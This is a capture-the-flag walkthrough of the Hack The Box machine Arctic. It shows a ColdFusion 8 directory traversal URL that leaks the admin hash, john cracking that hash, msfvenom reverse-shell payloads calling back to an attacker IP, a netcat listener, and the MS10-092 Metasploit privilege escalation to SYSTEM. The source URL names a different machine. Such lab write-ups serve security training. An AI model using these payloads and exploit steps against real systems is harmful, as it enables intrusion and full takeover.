# Arctic

URL: https://app.hackthebox.com/machines/Antique

Level: Easy

Date 26 Jun 2020

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.80 scan initiated Tue Jun 16 22:38:18 2020 as: nmap -T4 -A -p- -oN arctic_nmap.txt 10.10.10.11
Nmap scan report for 10.10.10.11
Host is up (0.045s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   44.25 ms 10.10.14.1
2   44.49 ms 10.10.10.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 16 22:42:46 2020 -- 1 IP address (1 host up) scanned in 269.56 seconds
```

We focus on port 8500/TCP. 

It is a webserver, and we found that page is made with ColfFusion.

![arctic](https://user-images.githubusercontent.com/42389836/156893517-85eb3aa5-4542-41c7-bddb-b5ada317ef74.png)

We found this page:

https://nets.ec/Coldfusion_hacking

then we try:

http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

We get this string:

```
#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true
```

According to `hashid`, it is probably SHA-1:

```
# hashid string
--File 'string'--
Analyzing '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'
[+] SHA-1
[+] Double SHA-1
[+] RIPEMD-160
[+] Haval-160
[+] Tiger-160
[+] HAS-160
[+] LinkedIn
[+] Skein-256(160)
[+] Skein-512(160)
--End of file 'string'--
```

We crack it:

```
# john -format:RAW-SHA1 string --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)
1g 0:00:00:00 DONE (2022-03-05 18:27) 10.00g/s 51200p/s 51200c/s 51200C/s jodie..babygrl
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

So far, we get access to ColdFusion.

We explore backend and we discover "Scheduled Tasks" under "DEBUGGING & LOGGING" section.

From there, we can upload stuff.

Let's generate a jsp payload with `msfvenom`:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.35 LPORT=4444 -f raw > shella.jsp
```

We listen on our attacking box:

```
nc -nlvvp 4444
```

and we obtain a shell:

http://10.10.10.11:8500/CFIDE/shella.jps

## User-flag

we are "tolis" user, and we can grab user flag.

## Privesc

We want a meterpreter shell, so we generate through `msfvenom`:

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.35 LPORT=4445 -f exe > asd.exe
```

We run listener through `msfconsole`:

```
msf > use exploit/multi/handler
        msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
        payload => windows/meterpreter/reverse_tcp
        msf exploit(handler) > set lhost 10.10.14.35
        msf exploit(handler) > set lport 4445
        run
```

Now we execute our payload:

```
c:\ColdFusion8\wwwroot\CFIDE\asd.exe
```

and we get shell.

We then migrate to `jrunsvc.exe`.

We use local suggester, and we found this path `ms10_092_schelevator`:

```
msf5 exploit(windows/local/ms10_092_schelevator) > show options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.35        yes       The listen address (an interface may be specified)
   LPORT     4446             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008


msf5 exploit(windows/local/ms10_092_schelevator) > set LHOST tun0
LHOST => tun0
msf5 exploit(windows/local/ms10_092_schelevator) > run
```

We got success!

```
msf5 exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.36:4446
[*] Preparing payload at C:\Users\tolis\AppData\Local\Temp\fwnFSzQdncwI.exe
[*] Creating task: IRpnMJUUBVSp
[*] SUCCESS: The scheduled task "IRpnMJUUBVSp" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\IRpnMJUUBVSp...
[*] Original CRC32: 0xc14244c5
[*] Final CRC32: 0xc14244c5
[*] Writing our modified content back...
[*] Validating task: IRpnMJUUBVSp
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] IRpnMJUUBVSp                             1/7/2020 8:42:00 ▒▒    Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "IRpnMJUUBVSp" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "IRpnMJUUBVSp" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (180291 bytes) to 10.10.10.11
[*] SUCCESS: Attempted to run the scheduled task "IRpnMJUUBVSp".
[*] SCHELEVATOR
[*] Deleting the task...
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/statement_cache.rb:90: warning: Capturing the given block using Proc.new is deprecated; use `&block` instead
[*] Meterpreter session 2 opened (10.10.14.36:4446 -> 10.10.10.11:49407) at 2020-06-26 23:45:02 +0200
[*] SUCCESS: The scheduled task "IRpnMJUUBVSp" was successfully deleted.
[*] SCHELEVATOR
```

```
meterpreter > shell
Process 3800 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```


